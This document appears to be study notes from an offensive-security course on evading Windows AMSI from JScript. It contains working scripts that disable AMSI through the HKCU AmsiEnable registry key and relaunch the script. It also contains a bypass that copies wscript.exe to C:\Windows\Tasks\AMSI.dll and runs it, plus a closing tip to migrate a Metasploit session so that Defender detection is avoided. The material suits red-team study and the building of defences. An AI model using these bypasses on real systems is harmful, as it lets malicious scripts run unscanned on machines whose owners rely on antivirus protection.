# Detecting the AMSI API Flow

Test File
```javascript
WScript.Sleep(20000);

var WshShell = new ActiveXObject("WScript.Shell");
WshShell.Run("calc");
```

Run frida and investigate

#  Modify AmsiEnable registry key

JScript tries to query AmsiEnable registry key

If the key is equal to 0, AMSI won't start for the JScript process
#### Function in WScript
```csharp
JAmsi::JAmsiIsEnabledByRegistry
```

#### Disable Registry Key in JScript
```javascript
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\AmsiEnable";
sh.RegWrite(key, 0, "REG_DWORD");
```

#### Improved for registry key check
```javascript
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\AmsiEnable";

try {
	var AmsiEnable = sh.RegRead(key);
    if(AmsiEnable != 0) {
    		throw new Error(1, '');
    }
} catch(e) {
	sh.RegWrite(key, 0, "REG_DWORD");
    	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} " + WScript.ScriptFullName, 0 ,1);
    	sh.RegWrite(key, 1, "REG_DWORD");
    	WScript.Quite(1);
}
```

# Tricking AMSI

While we cannot locate any of the structures to interact with the Win32 APIs from Jscript, we know that AMSI requires AMSI.DLL. If we could prevent AMSI.DLL from loading or load our own version of it, we could force the AMSI implementation in wscript.exe to produce an error and abort.

The second important thing to note is that double-clicking or running a file with a .dll extension will fail since DLLs are normally loaded, not executed. This behavior is actually caused by the Win32 ShellExecute415 API, which is used by cmd.exe. 

However, if we instead use the CreateProcess416 Win32 API, the file extension is ignored and the file header would be parsed to determine if it is a valid executable. We cannot directly call this API, but we can use the Exec417 method of the WScript.Shell object since it’s just a wrapper for it. 

Implementing this AMSI bypass requires a few new actions. When the Jscript is executed, it will copy wscript.exe to a writable and executable folder, naming it “amsi.dll”. Then, it will execute this copy while supplying the original Jscript file as in the previous bypass.

We check for the existence of AMSI.dll with try and catch statements to determine if the Jscript file is being executed for the first or the second time.

#### Rename and execute wscript.exe to amsi.dll
```javascript
var filesys = new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');
try 
{
    if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll") == 0)
    {
        throw new Error(1, '');
    }
}
catch(e)
{
    filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
    sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} " + WScript.ScriptFullName);
    WScript.Quit();
}
```

Defender detects the malware but we can use metasploit to migrate immediately upon a new session

